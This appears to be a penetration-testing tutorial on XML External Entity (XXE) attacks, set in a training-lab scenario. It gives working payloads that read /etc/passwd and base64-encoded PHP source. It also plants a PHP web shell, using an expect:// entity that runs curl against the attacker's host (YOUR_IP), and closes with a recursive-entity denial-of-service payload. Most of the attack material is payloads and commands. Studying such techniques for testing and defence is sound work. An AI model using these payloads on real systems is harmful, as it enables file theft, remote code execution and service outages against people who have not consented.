# Local File Disclosure

**Overview of XXE**

XML External Entity (XXE) vulnerabilities arise when a web application processes unfiltered XML data from user input, allowing attackers to define external entities that can reference local files on the server. This can lead to sensitive data exposure, including configuration files and source code, and can even enable remote code execution (RCE) under certain conditions.

**Identifying XXE Vulnerabilities**

To identify potential XXE vulnerabilities, look for web pages that accept XML input. For example, a contact form might send data in XML format:

**Contact Form Example**:

```
http://SERVER_IP:PORT/index.php
```

When submitting the form, intercept the HTTP request using a tool like Burp Suite. The request may look like this:

```http
POST /submitDetails.php HTTP/1.1
Content-Type: application/xml

<email>
  <name>John Doe</name>
  <tel>1234567890</tel>
  <email>email@xxe.htb</email>
  <message>Hello!</message>
</email>
```

If the application uses outdated XML libraries and does not sanitize input, it may be vulnerable to XXE.

**Testing for XXE**

1. **Initial Test**: Submit the form without modifications and observe the response. If the application echoes back the email value, it indicates a potential vulnerability.
2. **Defining Internal Entities**: To test further, define a new XML entity in the request:

```xml
xmlCopy Code<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Replace the email value with the entity reference:

```xml
<email>
  <name>John Doe</name>
  <tel>1234567890</tel>
  <email>&company;</email>
  <message>Hello!</message>
</email>
```

If the response shows "Inlane Freight" instead of "\&company;", the application is vulnerable to XXE.

**Reading Sensitive Files**

Once internal entities are confirmed, attempt to define external entities to read local files:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Send the modified request. If the response includes the contents of `/etc/passwd`, the XXE vulnerability has been successfully exploited.

**Reading Source Code**

To read the source code of files like `index.php`, use PHP's wrapper filters to avoid XML format issues:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

This will return a base64 encoded string of the file. Decode it to view the source code.

**Remote Code Execution (RCE)**

XXE can also lead to remote code execution. One method is to fetch a web shell from your server:

1.  **Create a PHP Web Shell**:

    ```bash
    echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
    ```
2.  **Start a Python HTTP Server**:

    ```bash
    python3 -m http.server 80
    ```
3.  **Use XXE to Download the Shell**:

    ```xml
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'YOUR_IP/shell.php'">
    ]>
    <email>
      <name>John Doe</name>
      <tel>1234567890</tel>
      <email>&company;</email>
      <message>Hello!</message>
    </email>
    ```

Replace spaces with `$IFS` to avoid breaking the XML syntax. If successful, you can interact with the web shell for command execution.

**Other XXE Attacks**

* **Server-Side Request Forgery (SSRF)**: Use XXE to access internal services or enumerate open ports.
* **Denial of Service (DoS)**: Create self-referencing entities to exhaust server resources, though modern servers often mitigate this.

**Example DoS Payload**:

```xml
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  ...
]>
<email>
  <name>John Doe</name>
  <tel>1234567890</tel>
  <email>&a10;</email>
  <message>Hello!</message>
</email>
```

This payload creates a recursive loop that can lead to server resource exhaustion.

#### Conclusion

XXE vulnerabilities can be exploited to read sensitive files, source code, and even execute remote commands. Identifying and exploiting these vulnerabilities requires careful testing and understanding of XML structure and entity definitions. Always ensure that XML input is properly sanitized and that secure coding practices are followed to mitigate these risks.
